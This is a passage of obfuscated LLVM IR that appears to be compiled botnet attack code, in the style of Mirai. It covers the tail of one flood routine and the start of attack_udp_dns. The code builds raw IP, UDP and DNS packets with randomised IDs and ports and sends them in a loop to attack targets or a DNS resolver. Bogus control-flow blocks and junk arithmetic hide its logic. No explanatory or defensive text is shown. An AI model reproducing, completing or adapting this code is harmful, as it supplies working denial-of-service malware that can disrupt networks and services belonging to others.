  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = bitcast %struct.sockaddr_in* %463 to %struct.sockaddr*
  store %struct.sockaddr* %464, %struct.sockaddr** %458, align 8
  %465 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %466 = load %struct.sockaddr*, %struct.sockaddr** %465, align 8
  %467 = call i64 @sendto(i32 %453, i8* %454, i64 %457, i32 16384, %struct.sockaddr* %466, i32 16)
  br label %468

; <label>:468:                                    ; preds = %421
  %469 = load i32, i32* @x.31
  %470 = load i32, i32* @y.32
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %468
  %477 = load i32, i32* %11, align 4
  %478 = add nsw i32 %477, 1
  store i32 %478, i32* %11, align 4
  %479 = load i32, i32* @x.31
  %480 = load i32, i32* @y.32
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart295, label %originalBB91alteredBB

originalBBpart295:                                ; preds = %originalBB91
  br label %285

; <label>:487:                                    ; preds = %originalBBpart277
  %488 = load i32, i32* @x.31
  %489 = load i32, i32* @y.32
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %487
  %496 = call i64 @time(i64* null) #6
  %497 = load i32, i32* %22, align 4
  %498 = sext i32 %497 to i64
  %499 = icmp sgt i64 %496, %498
  %500 = load i32, i32* @x.31
  %501 = load i32, i32* @y.32
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br i1 %499, label %508, label %509

; <label>:508:                                    ; preds = %originalBBpart299
  br label %510

; <label>:509:                                    ; preds = %originalBBpart299
  br label %284

; <label>:510:                                    ; preds = %508, %originalBBpart24, %originalBBpart2
  %511 = load i32, i32* @x.31
  %512 = load i32, i32* @y.32
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %510
  %519 = load i32, i32* @x.31
  %520 = load i32, i32* @y.32
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %66
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %527 = load i32, i32* %12, align 4
  %528 = call i32 @close(i32 %527)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %108
  %529 = load i32, i32* %11, align 4
  %530 = load i8, i8* %7, align 1
  %531 = zext i8 %530 to i32
  %532 = icmp slt i32 %529, %531
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %129
  %533 = call noalias i8* @calloc(i64 128, i64 1) #6
  %534 = load i8**, i8*** %13, align 8
  %535 = load i32, i32* %11, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds i8*, i8** %534, i64 %536
  store i8* %533, i8** %537, align 8
  %538 = load i8**, i8*** %13, align 8
  %539 = load i32, i32* %11, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds i8*, i8** %538, i64 %540
  %542 = load i8*, i8** %541, align 8
  %543 = bitcast i8* %542 to %struct.iphdr*
  store %struct.iphdr* %543, %struct.iphdr** %23, align 8
  %544 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %545 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %544, i64 1
  %546 = bitcast %struct.iphdr* %545 to %struct.udphdr*
  store %struct.udphdr* %546, %struct.udphdr** %24, align 8
  %547 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %548 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %547, i64 1
  %549 = bitcast %struct.udphdr* %548 to i8*
  store i8* %549, i8** %25, align 8
  %550 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %551 = bitcast %struct.iphdr* %550 to i8*
  %552 = load i8, i8* %551, align 4
  %_ = sub i8 %552, 15
  %gen = mul i8 %_, 15
  %_11 = shl i8 %552, 15
  %_12 = shl i8 %552, 15
  %_13 = shl i8 %552, 15
  %_14 = shl i8 %552, 15
  %553 = and i8 %552, 15
  %_15 = shl i8 %553, 64
  %_16 = shl i8 %553, 64
  %_17 = shl i8 %553, 64
  %_18 = sub i8 0, %553
  %gen19 = add i8 %_18, 64
  %_20 = sub i8 %553, 64
  %gen21 = mul i8 %_20, 64
  %_22 = sub i8 0, %553
  %gen23 = add i8 %_22, 64
  %554 = or i8 %553, 64
  store i8 %554, i8* %551, align 4
  %555 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %556 = bitcast %struct.iphdr* %555 to i8*
  %557 = load i8, i8* %556, align 4
  %_24 = shl i8 %557, -16
  %_25 = sub i8 0, %557
  %gen26 = add i8 %_25, -16
  %_27 = sub i8 0, %557
  %gen28 = add i8 %_27, -16
  %_29 = shl i8 %557, -16
  %_30 = sub i8 %557, -16
  %gen31 = mul i8 %_30, -16
  %_32 = sub i8 0, %557
  %gen33 = add i8 %_32, -16
  %558 = and i8 %557, -16
  %_34 = shl i8 %558, 5
  %_35 = sub i8 0, %558
  %gen36 = add i8 %_35, 5
  %_37 = sub i8 0, %558
  %gen38 = add i8 %_37, 5
  %_39 = sub i8 0, %558
  %gen40 = add i8 %_39, 5
  %_41 = shl i8 %558, 5
  %_42 = shl i8 %558, 5
  %559 = or i8 %558, 5
  store i8 %559, i8* %556, align 4
  %560 = load i8, i8* %14, align 1
  %561 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %562 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %561, i32 0, i32 1
  store i8 %560, i8* %562, align 1
  %563 = load i32, i32* %21, align 4
  %564 = sext i32 %563 to i64
  %_43 = sub i64 0, 32
  %gen44 = add i64 %_43, %564
  %_45 = sub i64 32, %564
  %gen46 = mul i64 %_45, %564
  %_47 = shl i64 32, %564
  %565 = add i64 32, %564
  %566 = trunc i64 %565 to i16
  %567 = call zeroext i16 @htons(i16 zeroext %566) #7
  %568 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %569 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %568, i32 0, i32 2
  store i16 %567, i16* %569, align 2
  %570 = load i16, i16* %15, align 2
  %571 = call zeroext i16 @htons(i16 zeroext %570) #7
  %572 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %573 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %572, i32 0, i32 3
  store i16 %571, i16* %573, align 4
  %574 = load i8, i8* %16, align 1
  %575 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %576 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %575, i32 0, i32 5
  store i8 %574, i8* %576, align 4
  %577 = load i8, i8* %17, align 1
  %578 = icmp ne i8 %577, 0
  br label %originalBB10

originalBB51alteredBB:                            ; preds = %originalBB51, %192
  %579 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %580 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 4
  store i16 %579, i16* %581, align 2
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %212
  %582 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %583 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %582, i32 0, i32 6
  store i8 17, i8* %583, align 1
  %584 = load i32, i32* @LOCAL_ADDR, align 4
  %585 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 8
  store i32 %584, i32* %586, align 4
  %587 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %588 = load i32, i32* %11, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i64 %589
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i32 0, i32 1
  %592 = load i32, i32* %591, align 4
  %593 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 9
  store i32 %592, i32* %594, align 4
  %595 = load i16, i16* %18, align 2
  %596 = call zeroext i16 @htons(i16 zeroext %595) #7
  %597 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %598 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %597, i32 0, i32 0
  store i16 %596, i16* %598, align 2
  %599 = load i16, i16* %19, align 2
  %600 = call zeroext i16 @htons(i16 zeroext %599) #7
  %601 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %602 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %601, i32 0, i32 1
  store i16 %600, i16* %602, align 2
  %603 = load i32, i32* %21, align 4
  %604 = sext i32 %603 to i64
  %_56 = sub i64 0, 12
  %gen57 = add i64 %_56, %604
  %_58 = sub i64 12, %604
  %gen59 = mul i64 %_58, %604
  %_60 = shl i64 12, %604
  %_61 = shl i64 12, %604
  %_62 = sub i64 0, 12
  %gen63 = add i64 %_62, %604
  %_64 = sub i64 0, 12
  %gen65 = add i64 %_64, %604
  %605 = add i64 12, %604
  %606 = trunc i64 %605 to i16
  %607 = call zeroext i16 @htons(i16 zeroext %606) #7
  %608 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %609 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %608, i32 0, i32 2
  store i16 %607, i16* %609, align 2
  %610 = load i8*, i8** %25, align 8
  %611 = bitcast i8* %610 to i32*
  store i32 -1, i32* %611, align 4
  %612 = load i8*, i8** %25, align 8
  %613 = getelementptr inbounds i8, i8* %612, i64 4
  store i8* %613, i8** %25, align 8
  %614 = load i8*, i8** %25, align 8
  %615 = load i8*, i8** %20, align 8
  %616 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %614, i8* %615, i32 %616)
  br label %originalBB55

originalBB69alteredBB:                            ; preds = %originalBB69, %264
  %617 = load i32, i32* %11, align 4
  %_70 = shl i32 %617, 1
  %_71 = shl i32 %617, 1
  %618 = add nsw i32 %617, 1
  store i32 %618, i32* %11, align 4
  br label %originalBB69

originalBB75alteredBB:                            ; preds = %originalBB75, %285
  %619 = load i32, i32* %11, align 4
  %620 = load i8, i8* %7, align 1
  %621 = zext i8 %620 to i32
  %622 = icmp slt i32 %619, %621
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %350
  %623 = call i32 @rand_next()
  %624 = trunc i32 %623 to i16
  %625 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %626 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %625, i32 0, i32 3
  store i16 %624, i16* %626, align 4
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %375
  %627 = call i32 @rand_next()
  %628 = trunc i32 %627 to i16
  %629 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %630 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %629, i32 0, i32 0
  store i16 %628, i16* %630, align 2
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %400
  %631 = call i32 @rand_next()
  %632 = trunc i32 %631 to i16
  %633 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %634 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %633, i32 0, i32 1
  store i16 %632, i16* %634, align 2
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %468
  %635 = load i32, i32* %11, align 4
  %_92 = sub i32 %635, 1
  %gen93 = mul i32 %_92, 1
  %636 = add nsw i32 %635, 1
  store i32 %636, i32* %11, align 4
  br label %originalBB91

originalBB97alteredBB:                            ; preds = %originalBB97, %487
  %637 = call i64 @time(i64* null) #6
  %638 = load i32, i32* %22, align 4
  %639 = sext i32 %638 to i64
  %640 = icmp sgt i64 %637, %639
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %510
  br label %originalBB101
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = add nsw i64 %81, %83
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %25, align 4
  %86 = load i8*, i8** %22, align 8
  %87 = icmp eq i8* %86, null
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %5
  br label %638

; <label>:89:                                     ; preds = %5
  %90 = load i32, i32* @x.33
  %91 = load i32, i32* @y.34
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %89
  %98 = load i8*, i8** %22, align 8
  %99 = call i32 @util_strlen(i8* %98)
  store i32 %99, i32* %23, align 4
  %100 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %100, i32* %12, align 4
  %101 = icmp eq i32 %100, -1
  %102 = load i32, i32* @x.33
  %103 = load i32, i32* @y.34
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %101, label %110, label %111

; <label>:110:                                    ; preds = %originalBBpart2
  br label %638

; <label>:111:                                    ; preds = %originalBBpart2
  %112 = load i32, i32* @x.33
  %113 = load i32, i32* @y.34
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %111
  store i32 1, i32* %11, align 4
  %120 = load i32, i32* %12, align 4
  %121 = bitcast i32* %11 to i8*
  %122 = call i32 @setsockopt(i32 %120, i32 0, i32 3, i8* %121, i32 4) #6
  %123 = icmp eq i32 %122, -1
  %124 = load i32, i32* @x.33
  %125 = load i32, i32* @y.34
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %123, label %132, label %135

; <label>:132:                                    ; preds = %originalBBpart24
  %133 = load i32, i32* %12, align 4
  %134 = call i32 @close(i32 %133)
  br label %638

; <label>:135:                                    ; preds = %originalBBpart24
  store i32 0, i32* %11, align 4
  br label %136

; <label>:136:                                    ; preds = %originalBBpart2110, %135
  %137 = load i32, i32* @x.33
  %138 = load i32, i32* @y.34
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %136
  %145 = load i32, i32* %11, align 4
  %146 = load i8, i8* %7, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp slt i32 %145, %147
  %149 = load i32, i32* @x.33
  %150 = load i32, i32* @y.34
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %148, label %157, label %396

; <label>:157:                                    ; preds = %originalBBpart28
  %158 = load i32, i32* @x.33
  %159 = load i32, i32* @y.34
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %157
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %166 = call noalias i8* @calloc(i64 600, i64 1) #6
  %167 = load i8**, i8*** %13, align 8
  %168 = load i32, i32* %11, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8*, i8** %167, i64 %169
  store i8* %166, i8** %170, align 8
  %171 = load i8**, i8*** %13, align 8
  %172 = load i32, i32* %11, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds i8*, i8** %171, i64 %173
  %175 = load i8*, i8** %174, align 8
  %176 = bitcast i8* %175 to %struct.iphdr*
  store %struct.iphdr* %176, %struct.iphdr** %29, align 8
  %177 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i64 1
  %179 = bitcast %struct.iphdr* %178 to %struct.udphdr*
  store %struct.udphdr* %179, %struct.udphdr** %30, align 8
  %180 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %181 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %180, i64 1
  %182 = bitcast %struct.udphdr* %181 to %struct.dnshdr*
  store %struct.dnshdr* %182, %struct.dnshdr** %31, align 8
  %183 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %184 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %183, i64 1
  %185 = bitcast %struct.dnshdr* %184 to i8*
  store i8* %185, i8** %32, align 8
  %186 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, 15
  %190 = or i8 %189, 64
  store i8 %190, i8* %187, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = bitcast %struct.iphdr* %191 to i8*
  %193 = load i8, i8* %192, align 4
  %194 = and i8 %193, -16
  %195 = or i8 %194, 5
  store i8 %195, i8* %192, align 4
  %196 = load i8, i8* %14, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 1
  store i8 %196, i8* %198, align 1
  %199 = load i8, i8* %21, align 1
  %200 = zext i8 %199 to i64
  %201 = add i64 41, %200
  %202 = add i64 %201, 2
  %203 = load i32, i32* %23, align 4
  %204 = sext i32 %203 to i64
  %205 = add i64 %202, %204
  %206 = add i64 %205, 4
  %207 = trunc i64 %206 to i16
  %208 = call zeroext i16 @htons(i16 zeroext %207) #7
  %209 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 2
  store i16 %208, i16* %210, align 2
  %211 = load i16, i16* %15, align 2
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 3
  store i16 %212, i16* %214, align 4
  %215 = load i8, i8* %16, align 1
  %216 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 5
  store i8 %215, i8* %217, align 4
  %218 = load i8, i8* %17, align 1
  %219 = icmp ne i8 %218, 0
  %220 = load i32, i32* @x.33
  %221 = load i32, i32* @y.34
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart274, label %originalBB10alteredBB

originalBBpart274:                                ; preds = %originalBB10
  br i1 %219, label %228, label %248

; <label>:228:                                    ; preds = %originalBBpart274
  %229 = load i32, i32* @x.33
  %230 = load i32, i32* @y.34
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %228
  %237 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %238 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 4
  store i16 %237, i16* %239, align 2
  %240 = load i32, i32* @x.33
  %241 = load i32, i32* @y.34
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %248

; <label>:248:                                    ; preds = %originalBBpart278, %originalBBpart274
  %249 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 6
  store i8 17, i8* %250, align 1
  %251 = load i32, i32* @LOCAL_ADDR, align 4
  %252 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 8
  store i32 %251, i32* %253, align 4
  %254 = load i32, i32* %24, align 4
  %255 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 9
  store i32 %254, i32* %256, align 4
  %257 = load i16, i16* %18, align 2
  %258 = call zeroext i16 @htons(i16 zeroext %257) #7
  %259 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 0
  store i16 %258, i16* %260, align 2
  %261 = load i16, i16* %19, align 2
  %262 = call zeroext i16 @htons(i16 zeroext %261) #7
  %263 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 1
  store i16 %262, i16* %264, align 2
  %265 = load i8, i8* %21, align 1
  %266 = zext i8 %265 to i64
  %267 = add i64 21, %266
  %268 = add i64 %267, 2
  %269 = load i32, i32* %23, align 4
  %270 = sext i32 %269 to i64
  %271 = add i64 %268, %270
  %272 = add i64 %271, 4
  %273 = trunc i64 %272 to i16
  %274 = call zeroext i16 @htons(i16 zeroext %273) #7
  %275 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %276 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %275, i32 0, i32 2
  store i16 %274, i16* %276, align 2
  %277 = load i16, i16* %20, align 2
  %278 = call zeroext i16 @htons(i16 zeroext %277) #7
  %279 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %280 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %279, i32 0, i32 0
  store i16 %278, i16* %280, align 2
  %281 = call zeroext i16 @htons(i16 zeroext 256) #7
  %282 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %283 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %282, i32 0, i32 1
  store i16 %281, i16* %283, align 2
  %284 = call zeroext i16 @htons(i16 zeroext 1) #7
  %285 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %286 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %285, i32 0, i32 2
  store i16 %284, i16* %286, align 2
  %287 = load i8, i8* %21, align 1
  %288 = load i8*, i8** %32, align 8
  %289 = getelementptr inbounds i8, i8* %288, i32 1
  store i8* %289, i8** %32, align 8
  store i8 %287, i8* %288, align 1
  %290 = load i8, i8* %21, align 1
  %291 = zext i8 %290 to i32
  %292 = load i8*, i8** %32, align 8
